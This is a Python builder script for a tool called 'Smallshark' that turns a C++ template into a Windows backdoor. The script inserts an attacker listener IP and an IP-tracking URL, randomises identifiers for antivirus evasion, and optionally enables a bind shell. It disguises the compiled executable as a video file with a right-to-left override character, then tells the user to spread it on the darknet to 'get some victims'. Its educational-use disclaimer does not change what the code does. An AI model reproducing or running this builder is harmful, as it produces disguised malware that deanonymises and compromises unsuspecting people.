#https://github.com/Nemesis0U/Smallshark
#DISCLAIMER: This tool is only for educational purposes and can only be used where strict consent has been given. Do not use this for illegal purposes.
import os
import pyfiglet
import string
import secrets
from colorama import init
from colorama import Fore, Back, Style
init(convert=True)
alphabet = string.ascii_letters
def Clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def RandomData():
    Random = ''.join(secrets.choice(alphabet) for i in range(16))
    return Random
Clear()
print(Fore.LIGHTBLUE_EX + r'''                                 ,-
                               ,'::|
                              /::::|
                            ,'::::o\                                      _..
         ____........-------,..::?88b                                  ,-' /
 _.--"""". . . .      .   .  .  .  ""`-._                           ,-' .;'
<. - :::::o......  ...   . . .. . .  .  .""--._                  ,-'. .;'
 `-._  ` `":`:`:`::||||:::::::::::::::::.:. .  ""--._ ,'|     ,-'.  .;'
     """_=--       //'doo.. ````:`:`::::::::::.:.:.:. .`-`._-'.   .;'
         ""--.__     P(       \               ` ``:`:``:::: .   .;'
                "\""--.:-.     `.                             .:/
                  \. /    `-._   `.""-----.,-..::(--"".\""`.  `:\
                   `P         `-._ \          `-:\          `. `:\
                                   ""            "            `-._) ''')
ascii_banner = pyfiglet.figlet_format("Smallshark")
print(Fore.LIGHTWHITE_EX + ascii_banner)
print("\nDeanonymization of TOR Users & Backdoor with FUD fake image files.\n\n")
polymorphic = RandomData()
polymorphic2 = RandomData()
polymorphic3 = RandomData()
polymorphic4 = RandomData()
polymorphic5 = RandomData()
with open('TemplateLinux.cpp') as f:
             Template = f.readlines()
             f.close()
generated = open("Generated.cpp", "a")
generated.truncate(0)
data = ''.join(Template)
ip = input("Enter Backdoor listener IP address: ")
url = input("Enter your IP tracker link address: ")
bindshellopt = input("Do you want to backdoor generated file? (Default port is 8443) Y/N: ")
polymorphiccode = secrets.token_hex(16)
randomfilename = ''.join(secrets.choice(alphabet) for i in range(8))
data = data.replace('(ipaddress)',ip)
data = data.replace('(url)', url)
data = data.replace('[rnd]', polymorphic)
data = data.replace('[sleeptime]', str(secrets.randbelow(15)))
data = data.replace('[bindshellopt]', polymorphic2)
data = data.replace('[shellcode]', polymorphic3)
data = data.replace('[rnd1]', polymorphic4)
data = data.replace('[shellcodesize]', polymorphic5)
data = data.replace('(randomstring)',polymorphiccode)
if(bindshellopt == "Y" or "y"):
   data = data.replace(polymorphic2 + ' = "0";', polymorphic2 +' = "1";') 

generated.writelines(data)
generated.close()
if os.system("g++ -x c++ -static-libgcc -static-libstdc++ Generated.cpp -Xlinker settings.o -o " + randomfilename +".exe") == 0:
    os.rename(randomfilename + ".exe", randomfilename + "\u202E4pm.exe")
    print("Detected OS: Windows")
    print("\n\nGhost Malware successfully generated! File Name: " + randomfilename)
    print("\nShare this file on Darknet to get some victims")
else:
     print("Installing dependencies...")
     os.system("sudo apt-get update") 
     os.system("sudo apt-get install mingw-w64")
     if os.system("i686-w64-mingw32-g++ -Xlinker settings.o -o " + randomfilename + " Generated.cpp") == 0:
          os.rename(randomfilename + ".exe", randomfilename + "\u202E4pm.exe")
          print("Detected OS: Linux")
          print("\n\nGhost Malware successfully generated! File Name: " + randomfilename)
          print("\nShare this file on Darknet to get some victims")
     else:
          print ("Failed to create file! G++ Error")
